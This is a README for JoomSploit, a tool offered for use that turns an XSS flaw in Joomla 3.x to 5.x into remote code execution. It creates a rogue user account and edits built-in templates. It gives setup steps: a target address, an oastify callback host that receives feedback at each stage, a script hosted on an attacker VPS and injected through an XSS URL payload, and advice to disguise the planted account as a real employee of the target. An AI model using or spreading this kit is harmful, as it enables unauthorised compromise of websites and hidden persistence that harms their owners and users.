
<h1 align="center">
  <br>
  <img src="https://github.com/nowak0x01/JoomSploit/assets/96009982/f77abced-baca-4ef5-89a4-a949b4ac6806" alt="JoomSploit" width="300">
</h1>
<h4 align="center">Joomla Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilities</a>.</h4>

<p align="center">
  <a href="#about">About</a>  -
  <a href="#key-features">Key Features</a>  -
  <a href="#how-to-use">How To Use</a>  -
  <a href="#examples">Examples</a>  -
  <a href="#contributing">Contributing</a>
</p>

![screenshot](https://github.com/nowak0x01/JoomSploit/assets/96009982/4e42f24e-2e42-4159-a39c-0884350fa57a)

## About
_**JoomSploit**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in Joomla CMS. <br><br>
🌾 **This script provides support for **Joomla** **Versions** **5.X.X**, **4.X.X**, and **3.X.X**.**
<br>

## Key Features

* _**Privilege Escalation**_
  - Creates an user in Joomla.
* _**(RCE) Built-In Templates Edit**_
  - Edit a Built-In Templates in Joomla.
* _**(Custom) Custom Exploits**_
  - Custom Exploits for Third-Party Joomla Plugins.
  
## How To Use
https://github.com/nowak0x01/JoomSploit/assets/96009982/216af695-1d46-4a3a-85aa-17858b49e6f0

<br>

**1\) Clone the Repository**
```bash
git clone https://github.com/nowak0x01/JoomSploit
```

**2\) Edit the script by selecting the desired function and modifying its variable values.** (Example: _**JLCreateAccount**_)
```
// ************************************ ~% Variables %~ ************************************ //

var Target = "http://10.5.87.12:8000/"; // Ex: https://192.168.1.99:6731/joomla/
var Callback = "https://prkiw0jsy7n0dj9qknrm57h9006ruji8.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// JLCreateAccount(); // (Privilege Escalation) - Creates an user in Joomla.
// JLEditTemplates(); // (RCE) - Edit Templates in Joomla.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party Joomla Plugins.

function JLCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
    var Name = "Hudson Nowak";                 // Account name, Ex: Robert Silva. - <Mandatory>
    var Password = `j^QEkyvd7*g3`;          // (Password minimum length: 12) [weak password are allowed]. - <Mandatory>
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
    /* ************************************************************************************************************************************************ */
```

**3\) Start a web server**
```bash
php -S 0.0.0.0:80 -t .
```

**4\) Go to the Joomla XSS vector and include** _**JoomSploit.js**_
```
https://example.com/plugin.php?s=<script%20src="//VPS/JoomSploit.js"></script>
```

## Examples
🎋 **_JLCreateAccount()_ - Creates an user in Joomla.**

https://github.com/nowak0x01/JoomSploit/assets/96009982/39311e64-36ba-4e7e-988b-d6c900a823e0

🐉 **_JLEditTemplates()_ - Edit a Built-In Templates in Joomla.**

https://github.com/nowak0x01/JoomSploit/assets/96009982/36dc82ee-d2cf-4f04-93d2-1d01221add19

⭐️ **_CustomExploits()_ - Custom Exploits for Third-Party Joomla Plugins**.<br>
// pending

<br>

# Contributing
If you're interested in contributing, whether by adding new exploit functions to `CustomExploits()` or enhancing the existing code, your efforts would be immensely appreciated. Your contributions will play a key role in making this project even better😊.
<pre>
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
     T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)         JoomSploit (https://github.com/nowak0x01/JoomSploit)
               (_/ .  \  :           / l      c"~o \
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-    @Author: Hudson Nowak
                 .^ '       :  T  ~"   ll
                / .  .  . : | :!        \\
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
</pre>
